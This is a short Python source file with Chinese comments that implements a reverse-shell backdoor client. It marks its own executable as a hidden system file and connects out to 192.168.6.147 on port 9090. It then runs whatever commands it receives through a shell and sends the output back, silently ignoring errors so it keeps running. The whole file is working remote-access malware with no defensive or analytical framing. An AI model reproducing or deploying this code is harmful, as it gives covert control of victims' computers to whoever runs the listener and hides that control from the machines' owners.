import os
import socket
import struct
import subprocess


def exe_cmd(command):
    """执行命令函数"""
    obj = subprocess.Popen(command.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
    stdout_res = obj.stdout.read() + obj.stderr.read()
    if not stdout_res:
        stdout_res = f'{command.decode("utf-8")} 执行成功'
        return stdout_res.encode("gbk")
    return stdout_res


def recv_data(cmd, buf_size=1024):
    """解决粘包"""
    # 先接受命令执行结果的长度
    x = cmd.recv(4)
    all_size = struct.unpack('i', x)[0]
    # 接收真实数据
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += cmd.recv(buf_size)
        recv_size += buf_size
    return data


def send_data(conn, cmd):
    """发送数据也解决粘包问题"""
    if type(cmd) == str:
        data = cmd.encode("utf-8")
    # 新增发送命令的粘包解决方案
    # 计算命令长度 , 打包发送
    cmd_len = struct.pack('i', len(cmd))
    conn.send(cmd_len)
    # 发送命令
    conn.send(cmd)


def main():
    # 隐藏文件
    file_path = os.path.abspath(__file__)
    path = os.path.join(os.path.dirname(file_path), "main.exe")
    os.system(f"attrib +s +h {path}")
    # 请求连接
    client = socket.socket()
    client.connect(('192.168.6.147', 9090))
    while 1:
        try:
            # 新增解包接收命令
            cmd = recv_data(client)  # 接收对面传过来的数据
            if cmd == b'q': break
            # 调用subprocess中的方法去执行这个系统命令
            data = exe_cmd(cmd)
            send_data(client, data)
        except Exception:
            pass
    client.close()


if __name__ == '__main__':
    main()
